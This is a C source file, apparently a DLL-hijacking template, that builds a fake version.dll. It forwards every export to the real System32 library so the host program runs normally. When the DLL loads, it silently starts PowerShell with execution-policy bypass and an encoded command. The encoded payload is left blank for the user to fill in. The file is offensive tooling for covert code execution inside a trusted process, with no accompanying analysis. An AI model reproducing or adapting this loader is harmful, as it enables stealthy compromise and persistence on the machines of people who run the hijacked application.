#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\windows\\System32\\version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker,"/export:VerFindFileA=C:\\windows\\System32\\version.VerFindFileA,@10")
#pragma comment(linker,"/export:VerFindFileW=C:\\windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker,"/export:VerInstallFileA=C:\\windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker,"/export:VerInstallFileW=C:\\windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker,"/export:VerLanguageNameA=C:\\windows\\System32\\version.VerLanguageNameA,@14")
#pragma comment(linker,"/export:VerLanguageNameW=C:\\windows\\System32\\version.VerLanguageNameW,@15")
#pragma comment(linker,"/export:VerQueryValueA=C:\\windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker,"/export:VerQueryValueW=C:\\windows\\System32\\version.VerQueryValueW,@17")

#include <windows.h>


int exp()
{
    system("start /b cmd.exe /c powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ");
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        exp();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}